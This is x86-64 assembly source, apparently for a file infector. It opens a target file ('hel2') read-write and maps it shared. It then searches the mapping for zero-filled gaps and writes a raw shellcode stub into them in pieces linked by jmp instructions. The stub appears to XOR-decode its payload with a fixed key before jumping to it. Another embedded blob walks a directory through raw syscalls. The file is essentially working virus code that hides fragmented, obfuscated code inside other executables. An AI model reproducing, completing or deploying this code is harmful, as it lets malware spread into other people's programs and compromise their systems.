section .data

f_n:  db "hel2", 0
sh:   times 0x112 db 0x48, 0x31, 0xD2, 0xBF, 0x2E, 0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xE7, 0xE8, 0xE7, 0x00, 0x00, 0x00, 0x5F, 0x50, 0x48, 0x81, 0xEC, 0x0B, 0x01, 0x00, 0x00, 0x48, 0x89, 0xE6, 0x48, 0x89, 0xC7, 0xE8, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x83, 0xF8, 0x01, 0x7C, 0x12, 0x48, 0x89, 0xC1, 0xE8, 0x13, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x0B, 0x01, 0x00, 0x00, 0x58, 0xEB, 0xD5, 0x48, 0x81, 0xC4, 0x0B, 0x01, 0x00, 0x00, 0x58, 0xC3, 0x48, 0x31, 0xC0, 0x48, 0x83, 0xC6, 0x10, 0x66, 0xAD, 0x48, 0x29, 0xC1, 0x66, 0xFF, 0xC8, 0x48, 0x83, 0xEE, 0x12, 0x48, 0x01, 0xC6, 0x80, 0x3E, 0x08, 0x74, 0x17, 0x80, 0x3E, 0x04, 0x74, 0x0C, 0x48, 0x83, 0xF9, 0x00, 0x7E, 0x05, 0x48, 0xFF, 0xC6, 0xEB, 0xD5, 0xC3, 0x56, 0x51, 0x59, 0x5E, 0xEB, 0xEE, 0x56, 0x51, 0x48, 0x29, 0xC6, 0x48, 0x83, 0xC6, 0x12, 0x48, 0x89, 0xF7, 0xE8, 0x56, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC6, 0x18, 0xAD, 0xA9, 0x41, 0x00, 0x00, 0x00, 0x74, 0x04, 0x48, 0x83, 0xC6, 0x14, 0x59, 0x5E, 0xEB, 0xC9, 0x48, 0x89, 0xCF, 0xBE, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x48, 0x89, 0xCF, 0xB8, 0x03, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x48, 0x89, 0xCF, 0x48, 0x89, 0xD6, 0x4C, 0x89, 0xC2, 0xB8, 0x0, 0x000, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x48, 0x89, 0xCF, 0x48, 0x89, 0xD6, 0x4C, 0x89, 0xC2, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x48, 0x81, 0xEC, 0xA4, 0x00, 0x00, 0x00, 0x48, 0x89, 0xE6, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x81, 0xC4, 0xA4, 0x00, 0x00, 0x00, 0xC3, 0xBE, 0x00, 0x00, 0x01, 0x00, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0xBA, 0xFF, 0x00, 0x00, 0x00, 0xB8, 0x4E, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3
co:   times 0x112 db 0x00
std_err:    times 0x1000  db 0x00

;section .text
ce:   times 0x112 db 0x00

section .text
shell1:  db 0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x58, 0x48, 0x31, 0xFF, 0x57, 0x58, 0x04, 0x0C, 0x50, 0x0F, 0x05, 0x5E, 0x50, 0x48, 0x05, 0x00, 0x10, 0x00, 0x00, 0x50, 0x5F, 0x56, 0x58, 0x0F, 0x05, 0x5F, 0xBE, 0x00, 0x10, 0x00, 0x00, 0x48, 0x31, 0xD2, 0x52, 0x80, 0xC2, 0x07, 0x58, 0x04, 0x0A, 0x0F, 0x05, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5E, 0x57, 0x48, 0x81, 0xC6, 0x45, 0x03, 0x00, 0x00, 0xB9, 0x18, 0x01, 0x00, 0x00, 0x48, 0xBB, 0xAA, 0xAA, 0xBB, 0xCB, 0xCC, 0xEE, 0xFE, 0xFF, 0x48, 0xAD, 0x48, 0x31, 0xD8, 0x48, 0xAB, 0x48, 0x29, 0xD1, 0xE2, 0xF4, 0x5F, 0xFF, 0xE7
tab_code_len:  db 5, 2, 3, 1, 1, 2, 1, 2, 1, 1, 6, 1, 1, 1, 1, 2, 1, 5, 3, 1, 3, 1, 2, 2, 5, 1, 1, 6, 5, 6, 2, 3, 2, 3, 2, 1, 2


global _s
_s:
      mov   rdi, f_n
      mov   rsi, 2
      mov   rdx, 0
      mov   rax, 2 
      syscall
      push  rax

      xor   rdi, rdi
      mov   rsi, 16000 
      mov   rdx, 0x03      ;READ_WRITE=2; READ=1; EXEC=4; NONE=0
      mov   r10, 0x01      ;MAP_PRIVAT=2; MAP_SHARED=1; MAP_FIXED=0x10
      mov   r8, rax
      mov   r9, 0x00
      mov   rax, 0x09
      syscall
      push  rax   
   

      add   rax, 0x1000
      mov   rsi, shell1
      mov   rdi, rax 
      mov   rdx, 0x1000
      mov   r8,  0x58 
      mov   r9,  tab_code_len
      call  f_nork

      pop   rdi
      mov   rsi, 16000
      mov   rax, 0x0b 
      ;syscall

      pop   rdi
      mov   rax, 3
      syscall

;====================================================================================================================================;
;IN:  rsi - bufer of code;    rdi - addr of section in file;   rdx - size of section;  r8 - size of code;   r9 - addr of tab_code_len;
;OUT: r8 - remaining code size                                                                                                                              ;
;====================================================================================================================================;
   find_nork:
      f_nork:
         xor   rcx,  rcx
         xor   r10,  r10
         jmp   ch_quor
      f_n1:
         cmp   rcx,  16
         jge   wr_nork
      f_n11:
         xor   rcx,  rcx
         ;add   rdi, 8
         ;sub   rdx, 8
         call  di_dx
      f_n12:
         cmp   rdx, 0
         jle   f_out 
         cmp   rcx, r8
         jge   wr_nork
      ch_quor:
         cmp   qword[rdi], 0x00
         jne   f_n1
         ;add   rcx,  8 
         ;add   rdi,  8
         ;sub   rdx,  8
         call  cx_di_dx
         cmp   rdx,  0
         jle   f_out
         cmp   qword[rdi], 0x00
         jne   f_n1
      f_n2:
         ;add   rcx,  8 
         ;add   rdi,  8 
         ;sub   rdx,  8 
         call  cx_di_dx
         jmp   f_n12
         
      wr_nork:
         sub   rcx, 4      ;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
         sub   rdi, rcx
         ;sub   rdi, 8
         ;sub   r8, rcx
         cmp   r10, 0
         je    wr_she
         ;call  my_ip_nork
      my_ip_nork:
         ;pop   rax
         mov   rax, rdi
         sub   rax, r10
         sub   rax, 4
         mov   dword[r10], eax
      wr_she:
         call  write_shell;rep   movsb
         mov   r10, rdi
         add   rdi, 4
         cmp   r8, 0
         jg    f_n11
         jmp   f_end
      f_out:
         cmp   rcx, 0
         jg    wr_nork
      f_end:
         cmp   r8, 0
         jge   f_exit
         xor   r8, r8
      f_exit:
         ret

   cx_di_dx:
         add   rcx, 8
      di_dx:
         add   rdi, 8
         sub   rdx, 8
      ret

;============================================================================================================================;
;IN: rdi-addr in file;  rsi-addr of code; rcx-size of free space in file for code; r8-size of code; r9 - addr of tab_code_len;
;OUT: rdi-addr of "jmp 'next comand of shell code'";  rsi-addr of code; r9 - addr of tab_code_len; r8 - remaining code size  ;
;============================================================================================================================;
   write_shell:
      wr_sh:
         xor   rax, rax
         sub   rcx, 5      ;size of jmp command
      w_s_f:
         add   al, byte[r9]
         inc   r9
         cmp   rax, r8
         jge   w_shell
         cmp   rax, rcx
         jl    w_s_f
         je    w_shell
         sub   al, byte[r9-1] 
         dec   r9
   w_shell:
         cmp   rax, r8
         jl    w_sh
         xchg  rax, r8
         xor   r8, r8
   w_sh:
         sub   r8,   rax
   w_no_ow1:
         xchg  rax, rcx
         rep   movsb
         cmp   r8, 0
         jle   w_shell_exit
         mov   byte[rdi], 0xe9   ;jmp
         inc   rdi
   w_shell_exit:
         ret










